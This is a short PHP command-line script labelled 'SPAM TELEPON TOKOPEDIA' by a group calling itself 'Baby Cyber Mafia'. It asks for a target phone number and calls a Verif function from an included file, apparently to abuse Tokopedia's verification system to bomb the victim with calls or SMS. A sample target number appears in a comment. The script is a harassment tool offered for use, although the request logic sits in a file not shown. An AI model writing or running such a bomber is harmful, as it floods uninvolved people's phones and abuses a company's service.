[+]====================================[+]

      # SPAM TELEPON TOKOPEDIA #
       ------------------------
       
By         = Baby Cyber Mafia 

Author = HanubyHell Gans 



[+]====================================[+]

<?php
include 'func.php';


$init = new Bom();

//Eksekusi Call/Sms Boomber (Limit 3x/Jam)

echo "Nomor? (ex : 628xxxx)\nInput : ";
$a = trim(fgets(STDIN));
$init->no = "$a";
$init->type = 2; //Type 2 untuk telpon, Type 1 untuk sms
//$init->no = "085346324563"; //Nomer Hp target

if ($init->type == 1) {
	for ($i=0; $i < 2; $i++) { 
	    $init->Verif($init->no,$init->type);
	}
}elseif ($init->type == 2) {
	 $init->Verif($init->no,$init->type);
}
